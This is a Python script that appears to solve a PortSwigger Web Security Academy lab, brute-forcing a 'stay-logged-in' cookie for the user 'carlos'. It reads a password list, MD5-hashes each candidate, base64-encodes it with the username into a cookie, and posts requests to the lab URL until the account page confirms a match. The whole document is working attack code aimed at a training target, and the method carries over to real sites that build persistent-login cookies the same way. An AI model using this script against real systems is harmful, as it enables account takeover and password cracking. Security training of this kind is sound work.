# Lab10 from portswigger: Brute-forcing a stay-logged-in cookie.
import requests
import hashlib
import base64
from termcolor import colored

url = "https://0a7600a7044f091fc0da0a7e004100fe.web-security-academy.net/my-account" # Set the url.

def cookie_brute_forcer(username):
    with open("/PATH/passwords.txt","r") as file: # Modify it with the passwords list path.
        for password in file:
            password = password.strip().encode()

            hashed_password = hashlib.md5(password) 
            # print(hashed_password.hexdigest())
            
            plaintext_cookie = f"{username}"+':'+f"{hashed_password.hexdigest()}" 
            cookie =base64.b64encode((plaintext_cookie.encode('utf-8')))
            # print(cookie.decode('utf-8'))
            stay_logged_in = cookie.decode('utf-8')
            
            cookies = {
                "session": "PJJEEyZq4IL14JK6iTzqzyxR6uERhbwA",   # Change it with your cookie value.
                "stay-logged-in": stay_logged_in
                }
            response = requests.post(url, cookies=cookies)
             
            # You can check for the valid cookie of the username with any condition you can see appropriate.  
            # "Update email" in response.text            
            if f"Your username is: {username}" in response.text:
                print(colored(f"[+] Valid password is found... ","green"))
                return password.decode()  
            else:
                print(colored(f"[!!] Incorrect password: {password.decode()}\n","red"))    
                   
def main():
    username = "carlos"
    password = cookie_brute_forcer(username)
    print()
    print(colored(f"[+] Password: --> {password}","green"))    

if __name__ == '__main__':
    main() 
